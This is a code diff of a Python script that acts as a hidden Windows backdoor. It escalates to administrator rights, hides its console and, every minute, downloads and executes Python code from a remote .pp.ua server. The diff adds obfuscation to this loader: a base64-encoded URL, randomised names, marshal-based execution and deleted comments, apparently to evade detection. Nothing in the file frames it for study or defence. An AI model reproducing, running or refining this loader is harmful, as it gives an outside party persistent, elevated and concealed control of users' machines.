@@ -1,60 +1,59 @@
 import os
-import urllib.request
-import time
-import ctypes
-import sys
+import urllib.request as cdfqv
+import time as xcyk
+import ctypes as jzdgf
+import sys as sdfu
+import base64
+import marshal
 
+zlrwcsn = base64.b64decode('aHR0cHM6Ly9uaWtlc3R5bGVzaXRlLnBwLnVhL2ZpbGVzL2FwcC5weS8=').decode('utf-8')
+tsxmwg = base64.b64decode('dG1wL3RlbXBfc2NyaXB0LnB5').decode('utf-8')
+dsrhpg = os.path.abspath(__file__)
 
-SERVER_URL = 'https://nikestylesite.pp.ua/files/app.py/'
-# Path where the script will be temporarily saved
-TEMP_SCRIPT_PATH = 'tmp/temp_script.py'
-# File path to the current script being executed
-CURRENT_SCRIPT_PATH = os.path.abspath(__file__)
-
-def is_admin():
+def _a39gfh12():
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
+        return jzdgf.windll.shell32.IsUserAnAdmin()
     except:
         return False
 
-def run_as_admin(script_path):
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script_path, None, 1)
+def _d29skdl(script_path):
+    jzdgf.windll.shell32.ShellExecuteW(None, "runas", sdfu.executable, script_path, None, 1)
 
-def download_script(url, path):
+def _grzqordg_vfulsw(url, path):
     try:
-        response = urllib.request.urlopen(url)
+        response = cdfqv.urlopen(url)
         with open(path, 'wb') as f:
             f.write(response.read())
     except Exception as e:
-        print(f"Error downloading script: {e}")
+        print(f"{e}")
 
-def is_server_reachable(url):
+def _rfysdjbnck(url):
     try:
-        response = urllib.request.urlopen(url, timeout=10)
+        response = cdfqv.urlopen(url, timeout=10)
         return response.status == 200
     except:
         return False
 
-def execute_script(path):
-    exec(open(path).read(), globals())
+def _marshal_extr(xyd):
+    marshaled_code = marshal.dumps(compile(open(xyd).read(), xyd, 'exec'))
+    exec(marshaled_code, globals())
 
-def main():
-    if not is_admin():
+def fzbnjc():
+    if not _a39gfh12():
         script_path = os.path.abspath(__file__)
-        run_as_admin(script_path)
-        sys.exit()
+        _d29skdl(script_path)
+        sdfu.exit()
 
     while True:
-        if is_server_reachable(SERVER_URL):
-            download_script(SERVER_URL, TEMP_SCRIPT_PATH)
-            if os.path.getmtime(CURRENT_SCRIPT_PATH) != os.path.getmtime(TEMP_SCRIPT_PATH):
-                execute_script(TEMP_SCRIPT_PATH)
-        time.sleep(60)
+        if _rfysdjbnck(zlrwcsn):
+            _grzqordg_vfulsw(zlrwcsn, tsxmwg)
+            if os.path.getmtime(dsrhpg) != os.path.getmtime(tsxmwg):
+                _marshal_extr(tsxmwg)
+        xcyk.sleep(60)
 
-# Hide the console window (Windows-specific)
 if os.name == 'nt':
-    ctypes.windll.kernel32.SetConsoleTitleW("Hidden")
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    jzdgf.windll.kernel32.SetConsoleTitleW(base64.b64decode('SGlkZGVu').decode('utf-8'))
+    jzdgf.windll.user32.ShowWindow(jzdgf.windll.kernel32.GetConsoleWindow(), 0)
 
 if __name__ == "__main__":
-    main()
+    fzbnjc()
